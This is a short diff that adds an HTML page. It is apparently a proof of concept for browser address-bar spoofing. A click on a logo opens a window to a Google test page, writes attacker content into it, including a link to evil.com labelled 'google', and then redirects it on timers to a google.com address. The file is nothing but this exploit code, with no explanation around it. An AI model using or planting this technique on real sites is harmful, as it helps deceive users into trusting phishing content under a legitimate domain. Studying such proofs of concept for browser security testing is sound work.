@@ -1,0 +1,15 @@
+<script>
+function a(){
+	let w = window.open('https://testsafebrowsing.appspot.com/s/malware.html');
+     w.document.write(`<body bgcolor=white>
+        <h1>Real Domain:</h1><span><a href="http://evil.com">google</a></span>
+        `);
+
+  setTimeout(()=>{
+      setTimeout(()=>{
+              w.location.replace("https://www.google.com/csi")
+      },1700)
+  },1500)
+}
+</script> 
+<center><img src="logo.png" onclick="a()"></center>
